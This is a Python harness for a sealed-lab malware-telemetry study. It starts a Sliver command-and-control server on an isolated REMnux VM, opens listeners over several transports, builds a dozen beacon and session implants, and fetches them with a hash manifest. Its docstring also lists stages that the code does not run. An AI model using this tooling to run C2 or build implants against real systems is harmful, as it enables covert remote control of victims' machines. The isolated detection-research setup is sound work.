"""Sink-side setup for the Sliver C2 testbed (sealed-lab detector-telemetry research).

Reuses the sinkhole driver's credential-safe Sink helpers (collect_sinkhole_c2.sink_run / sink_copyto). The Sink
is REMnux at 10.0.0.1 on the sealed malnet (re-verified isolated each call). Everything created lives under a
single lab directory on the Sink and is removed by the `clean` stage. Nothing here reaches outside malnet.

Stages (run one at a time, each prints what it did):
  copy    make the lab dir on the Sink; copy the two verified Sliver binaries; verify their SHA-256 there.
  server  unpack assets; start the server as a localhost-operator daemon; generate an operator config.
  listen  start the C2 listeners bound to 10.0.0.1 and generate one named implant per transport.
  fetch   copy the generated implants back to the host.
  status  show the daemon, listeners and generated implants.
  stop    stop the daemon.
  clean   stop the daemon and remove the lab directory.

Run: /usr/bin/python3 setup_sink.py <stage>
"""
import hashlib
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
import collect_sinkhole_c2 as c2  # noqa: E402  sink_run, sink_copyto, credential-safe

VENDOR = HERE / "vendor"
LAB = "/home/remnux/hazim-sliver"           # lab workspace on the Sink
BINS = {"sliver-server_linux-amd64": "6c54ea94961f15de22bb765911b850d054e66f69069e4b799ab7cc3134e8ef36",
        "sliver-client_linux-amd64": "9f66bd5d55ec190905688184b029032a0e8c454ff83b76c91884f65384207672"}


def sh(module, *argv, sudo=False, timeout_ms=120000):
    return c2.sink_run(module, list(argv), timeout_ms=timeout_ms, sudo=sudo)


def bash(module, script, sudo=False, timeout_ms=120000):
    return c2.sink_run(module, ["/bin/bash", "-lc", script], timeout_ms=timeout_ms, sudo=sudo)


def copy_stage(module):
    r = bash(module, "mkdir -p %s/implants %s/lab && echo ok" % (LAB, LAB))
    print("mkdir:", (r.stdout or r.stderr or "").strip())
    for name, want in BINS.items():
        local = VENDOR / name
        assert hashlib.sha256(local.read_bytes()).hexdigest() == want, "local hash changed: " + name
        print("copying %s (%d bytes) ..." % (name, local.stat().st_size))
        cp = c2.sink_copyto(module, local, "%s/%s" % (LAB, name))
        if cp.returncode != 0:
            print("  copyto rc=%s %s" % (cp.returncode, (cp.stderr or "").strip()[:200]))
            return
        r = sh(module, "/usr/bin/sha256sum", "%s/%s" % (LAB, name))
        got = (r.stdout or "").split()[0] if r.stdout else ""
        print("  on Sink sha256 %s %s" % (got[:16], "OK" if got == want else "MISMATCH(%s)" % want[:16]))
    bash(module, "chmod +x %s/sliver-server_linux-amd64 %s/sliver-client_linux-amd64" % (LAB, LAB))
    print("chmod +x done")


SERVER = "%s/sliver-server_linux-amd64" % LAB

# C2 listeners on high ports: no collision with INetSim (80/443) or dnsmasq (53) on the Sink. 10.0.0.1 = malnet.
LISTENERS = ["mtls -L 10.0.0.1 -l 8443",
             "http -L 10.0.0.1 -l 8080",
             "https -L 10.0.0.1 -l 8444",
             "wg -L 10.0.0.1 -l 51820"]
# implant specs: (name, mode, transport flags). Beacons use -S 5 -J 0 (regular 5 s cadence).
TRANSPORT = {"mtls": "-m 10.0.0.1:8443", "http": "-b http://10.0.0.1:8080",
             "https": "-b https://10.0.0.1:8444", "wg": "-g 10.0.0.1:51820"}
IMPLANTS = ([("lab-%s-beacon-%s" % (t, s), "beacon", t) for t in ("mtls", "http", "https", "wg") for s in "ab"]
            + [("lab-%s-session-%s" % (t, s), "session", t) for t in ("mtls", "wg") for s in "ab"])


def run_rc(module, lines, timeout_ms):
    body = "\n".join(lines + ["exit"])
    script = ("cat > %s/run.rc <<'RC'\n%s\nRC\ncd %s && timeout %d ./sliver-client_linux-amd64 "
              "--config op.cfg --rc run.rc 2>&1") % (LAB, body, LAB, timeout_ms // 1000 - 10)
    return c2.sink_run(module, ["/bin/bash", "-lc", script], timeout_ms=timeout_ms)


def gen_line(name, mode, transport):
    verb = "generate beacon -S 5 -J 0" if mode == "beacon" else "generate"
    return "%s -o linux -a amd64 %s -N %s -s ./implants/" % (verb, TRANSPORT[transport], name)


def listen_stage(module, test=True):
    lines = list(LISTENERS) + ["jobs"]
    if test:
        lines += [gen_line("lab-mtls-beacon-a", "beacon", "mtls"), "implants"]
    r = run_rc(module, lines, timeout_ms=300000)
    out = (r.stdout or "") + (r.stderr or "")
    for line in out.splitlines():
        if any(k in line for k in ("mtls", "http", "https", "wg", "Job", "job", "lab-", "error", "Error", "ELF", "Generating", "implant")):
            print(" ", line[:150])
    r = bash(module, "ls -l %s/implants/ 2>/dev/null; file %s/implants/* 2>/dev/null | head" % (LAB, LAB))
    print("implants on Sink:\n" + (r.stdout or "").strip())


def genall_stage(module):
    lines = [gen_line(*spec) for spec in IMPLANTS] + ["implants"]
    print("generating %d implants (each is a compile) ..." % len(IMPLANTS))
    r = run_rc(module, lines, timeout_ms=1500000)
    out = (r.stdout or "") + (r.stderr or "")
    for line in out.splitlines():
        if any(k in line for k in ("lab-", "error", "Error", "Generating", "saved")):
            print(" ", line[:150])
    r = bash(module, "ls -1 %s/implants/ 2>/dev/null | sort; echo '---'; ls -1 %s/implants/ | wc -l" % (LAB, LAB))
    print("implants on Sink:\n" + (r.stdout or "").strip())


def server_stage(module):
    print("unpack assets ...")
    r = bash(module, "cd %s && ./sliver-server_linux-amd64 unpack --force 2>&1 | tail -n 3" % LAB, timeout_ms=300000)
    print(" ", (r.stdout or r.stderr or "").strip()[-300:])
    # start the server as a daemon; operator gRPC on localhost only
    r = bash(module, "cd %s && setsid bash -c 'nohup ./sliver-server_linux-amd64 daemon -l 127.0.0.1 -p 31337 "
                     ">daemon.log 2>&1 & echo $! > daemon.pid' ; sleep 8 ; cat daemon.pid" % LAB, timeout_ms=120000)
    print("daemon pid:", (r.stdout or "").strip(), (r.stderr or "").strip()[:120])
    r = bash(module, "ss -ltn 2>/dev/null | grep -E '127.0.0.1:31337' || echo 'operator port not up yet'")
    print("operator port:", (r.stdout or r.stderr or "").strip())
    r = bash(module, "cd %s && tail -n 4 daemon.log 2>/dev/null" % LAB)
    print("daemon.log:", (r.stdout or "").strip()[-400:])
    # operator config for the local client
    r = bash(module, "cd %s && ./sliver-server_linux-amd64 operator -l 127.0.0.1 -p 31337 -n hazim -P all "
                     "-s %s/op.cfg 2>&1 | tail -n 3 ; ls -l %s/op.cfg" % (LAB, LAB, LAB), timeout_ms=120000)
    print("operator config:", (r.stdout or r.stderr or "").strip()[-300:])
    r = bash(module, "df -h /home 2>/dev/null | tail -1")
    print("Sink /home:", (r.stdout or "").strip())


def sink_copyfrom(module, remote, local):
    import tempfile
    fd, name = tempfile.mkstemp(prefix="hz-sinkpw-")
    secret = b""
    try:
        os.fchmod(fd, 0o600)
        secret = module.credentials().encode()
        os.write(fd, secret)
        os.close(fd)
        return module.vbox("guestcontrol", c2.SINK_VM, "copyfrom", "--username", c2.SINK_USER,
                           "--passwordfile", name, remote, str(local), check=False)
    finally:
        try:
            Path(name).write_bytes(b"\0" * max(len(secret), 64))
        except OSError:
            pass
        os.unlink(name)


def fetch_stage(module):
    out = HERE / "implants"
    out.mkdir(exist_ok=True)
    bash(module, "sudo -n tar czf %s/implants.tgz -C %s/implants . && sudo -n chown remnux:remnux "
                 "%s/implants.tgz && ls -l %s/implants.tgz" % (LAB, LAB, LAB, LAB), sudo=False)
    r = sink_copyfrom(module, "%s/implants.tgz" % LAB, out / "implants.tgz")
    print("copyfrom rc=%s %s" % (r.returncode, (r.stderr or "").strip()[:160]))
    import subprocess
    subprocess.run(["tar", "xzf", str(out / "implants.tgz"), "-C", str(out)], check=True)
    (out / "implants.tgz").unlink()
    names = sorted(p.name for p in out.iterdir() if p.name.startswith("lab-"))
    manifest = {}
    for n in names:
        h = hashlib.sha256((out / n).read_bytes()).hexdigest()
        rs = sh(module, "/usr/bin/sha256sum", "%s/implants/%s" % (LAB, n))
        on_sink = (rs.stdout or "").split()[0] if rs.stdout else ""
        mode = "beacon" if "beacon" in n else "session"
        transport = n.split("-")[1]
        manifest[n] = {"sha256": h, "sink_sha256_ok": on_sink == h, "mode": mode, "transport": transport,
                       "bytes": (out / n).stat().st_size}
        print("  %-20s %s sha %s %s" % (n, mode, h[:16], "OK" if on_sink == h else "MISMATCH"))
    import json
    (HERE / "implant_manifest.json").write_text(json.dumps(manifest, indent=1))
    print("%d implants fetched; manifest written" % len(names))


def main():
    stage = sys.argv[1] if len(sys.argv) > 1 else "status"
    module = c2.cp.frozen.helper()
    info = module.isolated(c2.SINK_VM)
    assert info["VMState"] == '"running"', "Sink not running"
    assert info.get("nic1") in ('"intnet"', "intnet"), "Sink nic1 not internal: %s" % info.get("nic1")
    print("Sink running, isolated (nic1=intnet). Stage:", stage)
    if stage == "copy":
        copy_stage(module)
    elif stage == "server":
        server_stage(module)
    elif stage == "listen":
        listen_stage(module, test=True)
    elif stage == "genall":
        genall_stage(module)
    elif stage == "fetch":
        fetch_stage(module)
    else:
        print("stage '%s' not run here" % stage)


if __name__ == "__main__":
    main()
